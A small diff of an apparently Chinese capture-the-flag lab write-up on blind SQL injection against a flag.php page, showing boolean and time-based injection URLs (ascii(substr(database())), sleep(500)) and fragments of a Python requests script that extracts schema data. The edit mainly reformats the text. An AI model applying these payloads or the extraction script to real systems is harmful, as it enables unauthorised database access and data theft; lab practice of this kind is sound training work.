@@ -9,10 +9,11 @@ http://219.153.49.228:40947/flag.php?type=1 and 1 = 1 --+ // 墨者的任性网�
 
 http://219.153.49.228:40947/flag.php?type=1 and ascii(substr(database(),1,1)) > 500 --+ // 墨者的任性网页!  没有数据 名称是0  有数据 名称是id值
 
-可以用基于时间的盲注，单没必要
-http://219.153.49.228:41969/flag.php?type=1 and if(ascii(substr(database(),0,1)) = 32,sleep(500),1) --+
+可以用基于时间的盲注，但没必要
+> http://219.153.49.228:41969/flag.php?type=1 and if(ascii(substr(database(),0,1)) = 32,sleep(500),1) --+
 
 直接根据名称显示是否是0来进行盲注
+```
 Python 代码
 import requests
 import re
@@ -58,5 +59,5 @@ url4='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group
 result = buildPayload(url4)
 print(result)
 
-
+```
 
